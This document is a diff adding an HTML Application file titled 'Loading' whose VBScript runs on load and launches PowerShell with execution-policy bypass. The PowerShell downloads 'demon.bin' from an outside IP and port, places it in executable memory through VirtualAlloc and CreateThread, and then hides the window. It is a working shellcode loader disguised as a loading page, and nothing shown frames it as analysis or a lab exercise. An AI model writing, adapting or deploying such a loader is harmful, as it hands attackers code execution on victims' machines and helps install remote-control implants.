@@ -1,0 +1,24 @@
+<html>
+<head>
+<title>Loading</title>
+<hta:application singleinstance="yes" windowstate="normal" />
+<script language="VBScript">
+Sub Window_OnLoad
+    cmd = "powershell -NoExit -nop -w normal -ep bypass -Command " & _
+          """$q=[char]34;" & _
+          "$sc = (New-Object Net.WebClient).DownloadData('http://192.168.131.130:9876/demon.bin'); " & _
+          "$s = '[DllImport('+$q+'kernel32'+$q+')] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d); [DllImport('+$q+'kernel32'+$q+')] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);'; " & _
+          "$k = Add-Type -MemberDefinition $s -Name K -PassThru; " & _
+          "$p = $k::VirtualAlloc([IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x40); " & _
+          "[Runtime.InteropServices.Marshal]::Copy($sc, 0, $p, $sc.Length); " & _
+          "$k::CreateThread([IntPtr]::Zero, 0, $p, [IntPtr]::Zero, 0, [IntPtr]::Zero); " & _
+          "Write-Host 'Shellcode running at:' $p; " & _
+          "Start-Sleep 60"""
+
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run cmd, 1, False
+    window.Close
+End Sub
+</script>
+</head>
+</html>
